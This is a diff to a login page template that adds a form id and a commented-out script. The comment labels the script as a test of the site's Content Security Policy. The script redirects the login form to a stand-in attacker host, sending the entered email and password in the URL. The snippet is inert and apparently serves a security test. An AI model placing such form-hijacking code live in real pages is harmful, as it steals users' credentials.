@@ -34,7 +34,7 @@
 <div class="container" style="max-width: 600px; margin-top: 50px;">
     <h3 class="mb-3 pb-2 pb-md-0 mb-md-5" style="text-align: left">Login</h3>
     <div id="logreg-forms">
-        <form name="login" action="login" method="POST">
+        <form name="login" action="login" id="login" method="POST">
             <input type="text" id="inputEmail" name="username" class="form-control" placeholder="Email" required autofocus>
             <br>
             <input type="password" id="inputPassword" name="password" class="form-control" placeholder="Password" required>
@@ -48,6 +48,12 @@
             <hr>
             <a class="btn btn-primary btn-block" href="/registration" id="btn-signup" style="color: white;"><i class="fas fa-user-plus"></i> Sign Up</a>
         </form>
+<!--        Use to Test Content Security Policy (REMOVE AFTER WRITING REPORT)-->
+<!--        <script>-->
+<!--            let form= document.forms.login;-->
+<!--            form.action="https://youaredoomed.com:9090/collect?u="+document.getElementById('inputEmail').value-->
+<!--               +"&p="+document.getElementById('inputPassword').value;-->
+<!--        </script>-->
     </div>
 </div>
 </body>
